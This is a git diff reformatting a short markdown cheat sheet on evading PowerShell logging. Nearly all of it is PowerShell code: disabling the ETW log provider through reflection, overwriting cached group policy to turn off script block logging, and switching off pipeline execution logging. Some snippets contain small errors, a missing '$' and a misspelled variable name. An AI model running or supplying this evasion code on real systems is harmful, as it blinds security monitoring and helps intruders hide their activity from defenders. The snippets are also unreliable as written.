@@ -1,29 +1,35 @@
-# POWERSHELL REFLECTION
+# Logging and Monitoring Evasion
 
-#### 1) $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+## POWERSHELL REFLECTION
 
-#### $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
+#### 1) 
 
-#### [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic, Instance').SetValue(etwProvider,0);
+    $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+
+    $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
+
+    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic, Instance').SetValue(etwProvider,0);
 
 #### 2) Compile to .ps1 script
 
-# GROUP POLICY TAKEOVER
+## GROUP POLICY TAKEOVER
 
-#### 1) $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
+#### 1) 
 
-#### $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
+    $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
 
-#### $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+    $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
 
-#### $GroupPolicyettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
+    $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
 
-# ABUSING LOG PIPELINE
+    $GroupPolicyettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
 
-#### $module = Get-Module Microsoft.Powershell.Utility
+## ABUSING LOG PIPELINE
 
-#### $module.LogPipelineExecutionDetails = $false
+    $module = Get-Module Microsoft.Powershell.Utility
 
-#### $snap = Get-PSSnapin Microsoft.Powershell.Core
+    $module.LogPipelineExecutionDetails = $false
 
-#### $snap.LogPipelineExecutionDetails = $false
+    $snap = Get-PSSnapin Microsoft.Powershell.Core
+
+    $snap.LogPipelineExecutionDetails = $false
